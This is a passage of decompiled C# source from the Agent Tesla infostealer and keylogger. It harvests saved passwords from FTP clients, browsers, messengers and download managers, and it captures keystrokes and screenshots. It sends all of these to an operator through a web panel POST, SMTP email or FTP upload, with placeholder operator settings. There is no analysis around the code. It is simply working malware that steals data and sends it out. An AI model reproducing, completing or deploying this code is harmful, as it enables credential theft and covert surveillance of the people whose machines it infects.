            string str7 = P.ReadFile(Interaction.Environ("APPDATA") + @"\CoreFTP\sites.idx");
            string str8 = P.RegRead(@"HKEY_CURRENT_USER\Software\FTPWare\COREFTP\Sites\" + str7 + "Host");
            string str10 = P.RegRead("HKEY_CURRENT_USERSoftwareFTPWareCOREFTPSites" + str7 + "Port");
            string stringToEscape = P.RegRead("HKEY_CURRENT_USERSoftwareFTPWareCOREFTPSites" + str7 + "User");
            string str11 = P.RegRead("HKEY_CURRENT_USERSoftwareFTPWareCOREFTPSites" + str7 + "PW");
            string str6 = P.RegRead("HKEY_CURRENT_USERSoftwareFTPWareCOREFTPSites" + str7 + "Name");
            if (stringToEscape != "")
            {
                postdata($"type={"passwords"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&wbscreen={null}&client={"CoreFTP"}&link={str8 + ":" + str10}&username={Uri.EscapeDataString(stringToEscape)}&password={Uri.EscapeDataString(str11)}&screen_name={null}");
            }
        }
        catch (Exception exception52)
        {
            ProjectData.SetProjectError(exception52);
            Exception exception22 = exception52;
            ProjectData.ClearProjectError();
        }
        try
        {
            if (BrowserRecovery.dyndns().Count > 0)
            {
                List<RecoveredBrowserAccount>.Enumerator enumerator21;
                try
                {
                    enumerator21 = BrowserRecovery.dyndns().GetEnumerator();
                    while (enumerator21.MoveNext())
                    {
                        RecoveredBrowserAccount account22 = enumerator21.Current;
                        browser = account22.Browser;
                        uRL = account22.URL;
                        userName = account22.UserName;
                        password = account22.Password;
                        if (LogType == "webpanel")
                        {
                            postdata($"type={"passwords"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&wbscreen={null}&client={browser}&link={uRL}&username={Uri.EscapeDataString(userName)}&password={Uri.EscapeDataString(password)}&screen_name={null}");
                        }
                        else if ((LogType == "smtp") | (LogType == "ftp"))
                        {
                            builder.AppendLine("<br>");
                            builder.AppendLine("URL:      " + uRL + "<br>");
                            builder.AppendLine("Username: " + userName + "<br>");
                            builder.AppendLine("Password: " + password + "<br>");
                            builder.AppendLine("Application: " + browser + "<br>");
                        }
                    }
                }
                finally
                {
                    enumerator21.Dispose();
                }
            }
        }
        catch (Exception exception53)
        {
            ProjectData.SetProjectError(exception53);
            Exception exception23 = exception53;
            ProjectData.ClearProjectError();
        }
        try
        {
            if (BrowserRecovery.FlashFXP().Count > 0)
            {
                List<RecoveredBrowserAccount>.Enumerator enumerator22;
                try
                {
                    enumerator22 = BrowserRecovery.FlashFXP().GetEnumerator();
                    while (enumerator22.MoveNext())
                    {
                        RecoveredBrowserAccount account23 = enumerator22.Current;
                        browser = account23.Browser;
                        uRL = account23.URL;
                        userName = account23.UserName;
                        password = account23.Password;
                        if (LogType == "webpanel")
                        {
                            postdata($"type={"passwords"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&wbscreen={null}&client={browser}&link={uRL}&username={Uri.EscapeDataString(userName)}&password={Uri.EscapeDataString(password)}&screen_name={null}");
                        }
                        else if ((LogType == "smtp") | (LogType == "ftp"))
                        {
                            builder.AppendLine("<br>");
                            builder.AppendLine("URL:      " + uRL + "<br>");
                            builder.AppendLine("Username: " + userName + "<br>");
                            builder.AppendLine("Password: " + password + "<br>");
                            builder.AppendLine("Application: " + browser + "<br>");
                        }
                    }
                }
                finally
                {
                    enumerator22.Dispose();
                }
            }
        }
        catch (Exception exception54)
        {
            ProjectData.SetProjectError(exception54);
            Exception exception24 = exception54;
            ProjectData.ClearProjectError();
        }
        try
        {
            object obj17 = BrowserRecovery.paltalk();
            if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj17, null, "Count", new object[0], null, null, null), 0, false))
            {
                IEnumerator enumerator23;
                try
                {
                    enumerator23 = ((IEnumerable) obj17).GetEnumerator();
                    while (enumerator23.MoveNext())
                    {
                        RecoveredBrowserAccount account24 = (RecoveredBrowserAccount) enumerator23.Current;
                        browser = account24.Browser;
                        uRL = account24.URL;
                        userName = account24.UserName;
                        password = account24.Password;
                        if (LogType == "webpanel")
                        {
                            postdata($"type={"passwords"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&wbscreen={null}&client={browser}&link={uRL}&username={Uri.EscapeDataString(userName)}&password={Uri.EscapeDataString(password)}&screen_name={null}");
                        }
                        else if ((LogType == "smtp") | (LogType == "ftp"))
                        {
                            builder.AppendLine("<br>");
                            builder.AppendLine("URL:      " + uRL + "<br>");
                            builder.AppendLine("Username: " + userName + "<br>");
                            builder.AppendLine("Password: " + password + "<br>");
                            builder.AppendLine("Application: " + browser + "<br>");
                        }
                    }
                }
                finally
                {
                    if (enumerator23 is IDisposable)
                    {
                        (enumerator23 as IDisposable).Dispose();
                    }
                }
            }
        }
        catch (Exception exception55)
        {
            ProjectData.SetProjectError(exception55);
            Exception exception25 = exception55;
            ProjectData.ClearProjectError();
        }
        try
        {
            object obj18 = BrowserRecovery.Pidgin();
            if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj18, null, "Count", new object[0], null, null, null), 0, false))
            {
                IEnumerator enumerator24;
                try
                {
                    enumerator24 = ((IEnumerable) obj18).GetEnumerator();
                    while (enumerator24.MoveNext())
                    {
                        RecoveredBrowserAccount account25 = (RecoveredBrowserAccount) enumerator24.Current;
                        browser = account25.Browser;
                        uRL = account25.URL;
                        userName = account25.UserName;
                        password = account25.Password;
                        if (LogType == "webpanel")
                        {
                            postdata($"type={"passwords"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&wbscreen={null}&client={browser}&link={uRL}&username={Uri.EscapeDataString(userName)}&password={Uri.EscapeDataString(password)}&screen_name={null}");
                        }
                        else if ((LogType == "smtp") | (LogType == "ftp"))
                        {
                            builder.AppendLine("<br>");
                            builder.AppendLine("URL:      " + uRL + "<br>");
                            builder.AppendLine("Username: " + userName + "<br>");
                            builder.AppendLine("Password: " + password + "<br>");
                            builder.AppendLine("Application: " + browser + "<br>");
                        }
                    }
                }
                finally
                {
                    if (enumerator24 is IDisposable)
                    {
                        (enumerator24 as IDisposable).Dispose();
                    }
                }
            }
        }
        catch (Exception exception56)
        {
            ProjectData.SetProjectError(exception56);
            Exception exception26 = exception56;
            ProjectData.ClearProjectError();
        }
        try
        {
            object obj19 = BrowserRecovery.SmartFTP();
            if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj19, null, "Count", new object[0], null, null, null), 0, false))
            {
                IEnumerator enumerator25;
                try
                {
                    enumerator25 = ((IEnumerable) obj19).GetEnumerator();
                    while (enumerator25.MoveNext())
                    {
                        RecoveredBrowserAccount account26 = (RecoveredBrowserAccount) enumerator25.Current;
                        browser = account26.Browser;
                        uRL = account26.URL;
                        userName = account26.UserName;
                        password = account26.Password;
                        if (LogType == "webpanel")
                        {
                            postdata($"type={"passwords"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&wbscreen={null}&client={browser}&link={uRL}&username={Uri.EscapeDataString(userName)}&password={Uri.EscapeDataString(password)}&screen_name={null}");
                        }
                        else if ((LogType == "smtp") | (LogType == "ftp"))
                        {
                            builder.AppendLine("<br>");
                            builder.AppendLine("URL:      " + uRL + "<br>");
                            builder.AppendLine("Username: " + userName + "<br>");
                            builder.AppendLine("Password: " + password + "<br>");
                            builder.AppendLine("Application: " + browser + "<br>");
                        }
                    }
                }
                finally
                {
                    if (enumerator25 is IDisposable)
                    {
                        (enumerator25 as IDisposable).Dispose();
                    }
                }
            }
        }
        catch (Exception exception57)
        {
            ProjectData.SetProjectError(exception57);
            Exception exception27 = exception57;
            ProjectData.ClearProjectError();
        }
        try
        {
            if (BrowserRecovery.FtpCommander().Count > 0)
            {
                List<RecoveredBrowserAccount>.Enumerator enumerator26;
                try
                {
                    enumerator26 = BrowserRecovery.FtpCommander().GetEnumerator();
                    while (enumerator26.MoveNext())
                    {
                        RecoveredBrowserAccount account27 = enumerator26.Current;
                        browser = account27.Browser;
                        uRL = account27.URL;
                        userName = account27.UserName;
                        password = account27.Password;
                        if (LogType == "webpanel")
                        {
                            postdata($"type={"passwords"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&wbscreen={null}&client={browser}&link={uRL}&username={Uri.EscapeDataString(userName)}&password={Uri.EscapeDataString(password)}&screen_name={null}");
                        }
                        else if ((LogType == "smtp") | (LogType == "ftp"))
                        {
                            builder.AppendLine("<br>");
                            builder.AppendLine("URL:      " + uRL + "<br>");
                            builder.AppendLine("Username: " + userName + "<br>");
                            builder.AppendLine("Password: " + password + "<br>");
                            builder.AppendLine("Application: " + browser + "<br>");
                        }
                    }
                }
                finally
                {
                    enumerator26.Dispose();
                }
            }
        }
        catch (Exception exception58)
        {
            ProjectData.SetProjectError(exception58);
            Exception exception28 = exception58;
            ProjectData.ClearProjectError();
        }
        try
        {
            if (BrowserRecovery.no_ip().Count > 0)
            {
                List<RecoveredBrowserAccount>.Enumerator enumerator27;
                try
                {
                    enumerator27 = BrowserRecovery.no_ip().GetEnumerator();
                    while (enumerator27.MoveNext())
                    {
                        RecoveredBrowserAccount account28 = enumerator27.Current;
                        browser = account28.Browser;
                        uRL = account28.URL;
                        userName = account28.UserName;
                        password = account28.Password;
                        if (LogType == "webpanel")
                        {
                            postdata($"type={"passwords"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&wbscreen={null}&client={browser}&link={uRL}&username={Uri.EscapeDataString(userName)}&password={Uri.EscapeDataString(password)}&screen_name={null}");
                        }
                        else if ((LogType == "smtp") | (LogType == "ftp"))
                        {
                            builder.AppendLine("<br>");
                            builder.AppendLine("URL:      " + uRL + "<br>");
                            builder.AppendLine("Username: " + userName + "<br>");
                            builder.AppendLine("Password: " + password + "<br>");
                            builder.AppendLine("Application: " + browser + "<br>");
                        }
                    }
                }
                finally
                {
                    enumerator27.Dispose();
                }
            }
        }
        catch (Exception exception59)
        {
            ProjectData.SetProjectError(exception59);
            Exception exception29 = exception59;
            ProjectData.ClearProjectError();
        }
        try
        {
            if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(P.IDM.Recover(), null, "Count", new object[0], null, null, null), 0, false))
            {
                IEnumerator enumerator28;
                try
                {
                    enumerator28 = ((IEnumerable) P.IDM.Recover()).GetEnumerator();
                    while (enumerator28.MoveNext())
                    {
                        RecoveredBrowserAccount account29 = (RecoveredBrowserAccount) enumerator28.Current;
                        browser = account29.Browser;
                        uRL = account29.URL;
                        userName = account29.UserName;
                        password = account29.Password;
                        if (LogType == "webpanel")
                        {
                            postdata($"type={"passwords"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&wbscreen={null}&client={browser}&link={uRL}&username={Uri.EscapeDataString(userName)}&password={Uri.EscapeDataString(password)}&screen_name={null}");
                        }
                        else if ((LogType == "smtp") | (LogType == "ftp"))
                        {
                            builder.AppendLine("<br>");
                            builder.AppendLine("URL:      " + uRL + "<br>");
                            builder.AppendLine("Username: " + userName + "<br>");
                            builder.AppendLine("Password: " + password + "<br>");
                            builder.AppendLine("Application: " + browser + "<br>");
                        }
                    }
                }
                finally
                {
                    if (enumerator28 is IDisposable)
                    {
                        (enumerator28 as IDisposable).Dispose();
                    }
                }
            }
        }
        catch (Exception exception60)
        {
            ProjectData.SetProjectError(exception60);
            Exception exception30 = exception60;
            ProjectData.ClearProjectError();
        }
        try
        {
            object obj20 = BrowserRecovery.JDownloader();
            if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(obj20, null, "Count", new object[0], null, null, null), 0, false))
            {
                IEnumerator enumerator29;
                try
                {
                    enumerator29 = ((IEnumerable) obj20).GetEnumerator();
                    while (enumerator29.MoveNext())
                    {
                        RecoveredBrowserAccount account30 = (RecoveredBrowserAccount) enumerator29.Current;
                        browser = account30.Browser;
                        uRL = account30.URL;
                        userName = account30.UserName;
                        password = account30.Password;
                        if (LogType == "webpanel")
                        {
                            postdata($"type={"passwords"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={null}&ipadd={null}&wbscreen={null}&client={browser}&link={uRL}&username={Uri.EscapeDataString(userName)}&password={Uri.EscapeDataString(password)}&screen_name={null}");
                        }
                        else if ((LogType == "smtp") | (LogType == "ftp"))
                        {
                            builder.AppendLine("<br>");
                            builder.AppendLine("URL:      " + uRL + "<br>");
                            builder.AppendLine("Username: " + userName + "<br>");
                            builder.AppendLine("Password: " + password + "<br>");
                            builder.AppendLine("Application: " + browser + "<br>");
                        }
                    }
                }
                finally
                {
                    if (enumerator29 is IDisposable)
                    {
                        (enumerator29 as IDisposable).Dispose();
                    }
                }
            }
        }
        catch (Exception exception61)
        {
            ProjectData.SetProjectError(exception61);
            Exception exception31 = exception61;
            ProjectData.ClearProjectError();
        }
        if (builder.ToString() == "")
        {
            return;
        }
        if (LogType == "smtp")
        {
            try
            {
                string subject = SystemInformation.UserName + "/" + SystemInformation.ComputerName + " Passwords Recovered From: " + GetExternalIp() + "  [Agent Tesla]";
                string body = "<span style=font-family:Courier New;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:#000000;>Local&nbsp;Time&nbsp;&nbsp;&nbsp;&nbsp;: " + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + GetInfo(InfoTypes.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + GetInfo(InfoTypes.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + GetInfo(InfoTypes.AmountOfMemory) + "<br>VideocardName&nbsp;: " + GetInfo(InfoTypes.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + GetInfo(InfoTypes.VideocardMem) + "<br>=================================================</span><br><span style=font-family:tahoma;font-size:14px;font-style:normal;text-decoration:none;text-transform:none;color:#000000;><br>" + builder.ToString() + "</span>";
                Sendmail("%toemail%", subject, body, "", "");
                goto Label_3B4F;
            }
            catch (Exception exception62)
            {
                ProjectData.SetProjectError(exception62);
                builder = null;
                ProjectData.ClearProjectError();
                goto Label_3B4F;
            }
        }
        if (LogType == "ftp")
        {
            string str15 = "yyyy_MM_dd_HH_mm_ss";
            try
            {
                UploadFTP("Agent_Tesla_Password_Recoveries_" + computer_name.Replace("/", "-") + "_" + DateTime.Now.ToString(str15) + ".html", "<html><span style=font-family:Courier New;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:#000000;>Local&nbsp;Time&nbsp;&nbsp;&nbsp;&nbsp;: " + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + GetInfo(InfoTypes.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + GetInfo(InfoTypes.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + GetInfo(InfoTypes.AmountOfMemory) + "<br>VideocardName&nbsp;: " + GetInfo(InfoTypes.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + GetInfo(InfoTypes.VideocardMem) + "<br>=================================================</span><br><span style=font-family:tahoma;font-size:14px;font-style:normal;text-decoration:none;text-transform:none;color:#000000;><br>" + builder.ToString() + "</span></html>");
            }
            catch (Exception exception63)
            {
                ProjectData.SetProjectError(exception63);
                builder = null;
                ProjectData.ClearProjectError();
            }
        }
    Label_3B4F:
        builder = null;
    }

    private static void SendLog_Tick(object sender, ElapsedEventArgs e)
    {
        if (Log != "")
        {
            DateTime now = DateTime.Now;
            string format = "MM/dd/yyyy HH:mm:ss";
            string log = Log;
            lock (log)
            {
                Log_html = Log_html + Log;
                Log = "";
            }
            if (LogType == "webpanel")
            {
                try
                {
                    if (System.IO.File.Exists(Path.GetTempPath() + "/log.tmp"))
                    {
                        postdata($"type={"keylog"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={Uri.EscapeDataString(System.IO.File.ReadAllText(Path.GetTempPath() + "/log.tmp"))}&screen={null}&ipadd={null}&webcam_link={null}&client={null}&link={null}&username={null}&password={null}&screen_link={null}");
                        System.IO.File.Delete(Path.GetTempPath() + "/log.tmp");
                    }
                    postdata($"type={"keylog"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={Uri.EscapeDataString(Log_html)}&screen={null}&ipadd={null}&webcam_link={null}&client={null}&link={null}&username={null}&password={null}&screen_link={null}");
                    Log_html = "";
                    return;
                }
                catch (Exception exception1)
                {
                    ProjectData.SetProjectError(exception1);
                    System.IO.File.AppendAllText(Path.GetTempPath() + "/log.tmp", "[SavedLog (" + DateTime.Now.ToString(Format) + ")]<br>" + Log_html + "<br>");
                    Log_html = "";
                    ProjectData.ClearProjectError();
                    return;
                }
            }
            if (LogType == "smtp")
            {
                try
                {
                    if (System.IO.File.Exists(Path.GetTempPath() + "/log.tmp"))
                    {
                        string str5 = "[Saved Log] " + SystemInformation.UserName + "/" + SystemInformation.ComputerName + " Keystrokes From: " + GetExternalIp() + "  [Agent Tesla]";
                        string str4 = "<span style=font-family:Courier New;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:#000000;>Local&nbsp;Time&nbsp;&nbsp;&nbsp;&nbsp;: " + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + GetInfo(InfoTypes.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + GetInfo(InfoTypes.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + GetInfo(InfoTypes.AmountOfMemory) + "<br>VideocardName&nbsp;: " + GetInfo(InfoTypes.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + GetInfo(InfoTypes.VideocardMem) + "<br>=================================================</span><br><span style=font-family:tahoma;font-size:14px;font-style:normal;text-decoration:none;text-transform:none;color:#000000;><br>" + System.IO.File.ReadAllText(Path.GetTempPath() + "/log.tmp") + "</span>";
                        Sendmail("%toemail%", str5, str4, "", "");
                        System.IO.File.Delete(Path.GetTempPath() + "/log.tmp");
                    }
                    string subject = SystemInformation.UserName + "/" + SystemInformation.ComputerName + " Keystrokes From: " + GetExternalIp() + "  [Agent Tesla]";
                    string body = "<span style=font-family:Courier New;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:#000000;>Local&nbsp;Time&nbsp;&nbsp;&nbsp;&nbsp;: " + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + GetInfo(InfoTypes.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + GetInfo(InfoTypes.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + GetInfo(InfoTypes.AmountOfMemory) + "<br>VideocardName&nbsp;: " + GetInfo(InfoTypes.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + GetInfo(InfoTypes.VideocardMem) + "<br>=================================================</span><br><span style=font-family:tahoma;font-size:14px;font-style:normal;text-decoration:none;text-transform:none;color:#000000;><br>" + Log_html + "</span>";
                    Sendmail("%toemail%", subject, body, "", "");
                    Log_html = "";
                    return;
                }
                catch (Exception exception2)
                {
                    ProjectData.SetProjectError(exception2);
                    System.IO.File.AppendAllText(Path.GetTempPath() + "/log.tmp", "[SavedLog (" + DateTime.Now.ToString(Format) + ")]<br>" + Log_html + "<br>");
                    Log_html = "";
                    ProjectData.ClearProjectError();
                    return;
                }
            }
            if (LogType == "ftp")
            {
                try
                {
                    string str6 = "yyyy_MM_dd_HH_mm_ss";
                    if (System.IO.File.Exists(Path.GetTempPath() + "/log.tmp"))
                    {
                        UploadFTP("Saved_Log_From_" + computer_name.Replace("/", "-") + "_" + DateTime.Now.ToString(str6) + ".html", "<html><span style=font-family:Courier New;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:#000000;>Local&nbsp;Time&nbsp;&nbsp;&nbsp;&nbsp;: " + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + GetInfo(InfoTypes.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + GetInfo(InfoTypes.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + GetInfo(InfoTypes.AmountOfMemory) + "<br>VideocardName&nbsp;: " + GetInfo(InfoTypes.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + GetInfo(InfoTypes.VideocardMem) + "<br>=================================================</span><br><span style=font-family:tahoma;font-size:14px;font-style:normal;text-decoration:none;text-transform:none;color:#000000;><br>" + System.IO.File.ReadAllText(Path.GetTempPath() + "/log.tmp") + "</span></html>");
                        System.IO.File.Delete(Path.GetTempPath() + "/log.tmp");
                    }
                    UploadFTP("Agent_Tesla_Keystrokes_" + computer_name.Replace("/", "-") + "_" + DateTime.Now.ToString(str6) + ".html", "<html><span style=font-family:Courier New;font-size:14px;font-style:normal;font-weight:bold;text-decoration:none;text-transform:none;color:#000000;>Local&nbsp;Time&nbsp;&nbsp;&nbsp;&nbsp;: " + now.ToString(format) + "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.UserName + "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + SystemInformation.ComputerName + "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " + GetInfo(InfoTypes.OperatingSystemName) + "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.Platform.ToString() + "<br>OS&nbsp;Version&nbsp;&nbsp;&nbsp;&nbsp;: " + Environment.OSVersion.VersionString + "<br>CPU&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + GetInfo(InfoTypes.ProcessorName) + "<br>RAM&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " + GetInfo(InfoTypes.AmountOfMemory) + "<br>VideocardName&nbsp;: " + GetInfo(InfoTypes.VideocardName) + "<br>VideocardMem&nbsp;&nbsp;: " + GetInfo(InfoTypes.VideocardMem) + "<br>=================================================</span><br><span style=font-family:tahoma;font-size:14px;font-style:normal;text-decoration:none;text-transform:none;color:#000000;><br>" + Log_html + "</span></html>");
                    Log_html = "";
                }
                catch (Exception exception3)
                {
                    ProjectData.SetProjectError(exception3);
                    System.IO.File.AppendAllText(Path.GetTempPath() + "/log.tmp", "[SavedLog (" + DateTime.Now.ToString(Format) + ")]<br>" + Log_html + "<br>");
                    Log_html = "";
                    ProjectData.ClearProjectError();
                }
            }
        }
    }

    public static bool Sendmail(string ToEmail, string subject, string body, string Attm = "", string Attm2 = "")
    {
        bool flag;
        try
        {
            SmtpClient client = new SmtpClient();
            MailAddress to = new MailAddress(ToEmail);
            MailAddress from = new MailAddress("%mailaddres%");
            MailMessage message = new MailMessage(from, to) {
                IsBodyHtml = true,
                Subject = subject,
                Body = body
            };
            if (Strings.Len(Attm) > 0)
            {
                Attachment item = new Attachment(Attm);
                message.Attachments.Add(item);
            }
            if (Strings.Len(Attm2) > 0)
            {
                Attachment attachment2 = new Attachment(Attm2);
                message.Attachments.Add(attachment2);
            }
            NetworkCredential credential = new NetworkCredential("%mailaddres%", "%password%");
            client.Host = "%smtp%";
            client.UseDefaultCredentials = false;
            client.Credentials = credential;
            client.EnableSsl = true;
            client.Port = 0x24b;
            client.Send(message);
            message.Attachments.Dispose();
            flag = true;
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            flag = false;
            ProjectData.ClearProjectError();
        }
        return flag;
    }

    [DllImport("user32")]
    public static extern int SendMessage(int hWnd, uint Msg, int wParam, int lParam);
    private static void SendScreen_Tick(object sender, ElapsedEventArgs e)
    {
        try
        {
            Size blockRegionSize = new Size(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
            Bitmap image = new Bitmap(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
            EncoderParameters encoderParams = new EncoderParameters(1);
            System.Drawing.Imaging.Encoder quality = System.Drawing.Imaging.Encoder.Quality;
            ImageCodecInfo encoderInfo = GetEncoderInfo(ImageFormat.Jpeg);
            EncoderParameter parameter = new EncoderParameter(quality, 50L);
            encoderParams.Param[0] = parameter;
            Point upperLeftSource = new Point(0, 0);
            Point upperLeftDestination = new Point(0, 0);
            Graphics.FromImage(image).CopyFromScreen(upperLeftSource, upperLeftDestination, blockRegionSize);
            if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ScreenShot"))
            {
                Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ScreenShot");
                System.IO.File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ScreenShot", FileAttributes.Hidden);
            }
            image.Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ScreenShot\screen.jpeg", encoderInfo, encoderParams);
            if (LogType == "webpanel")
            {
                if (pc_state)
                {
                    string str = Convert.ToBase64String(System.IO.File.ReadAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ScreenShot\screen.jpeg"));
                    postdata($"type={"screenshots"}&hwid={hwid_id}&time={DateTime.Now.ToString(Format)}&pcname={computer_name}&logdata={null}&screen={str}&ipadd={null}&webcam_link={null}&client={null}&link={null}&username={null}&password={null}&screen_link={null}");
                }
            }
            else if (LogType == "smtp")
            {
                DateTime now = DateTime.Now;
                string format = "MM/dd/yyyy HH:mm:ss";
                string subject = SystemInformation.UserName + "/" + SystemInformation.ComputerName + " Screen Capture From: " + GetExternalIp() + "  [Agent Tesla]";
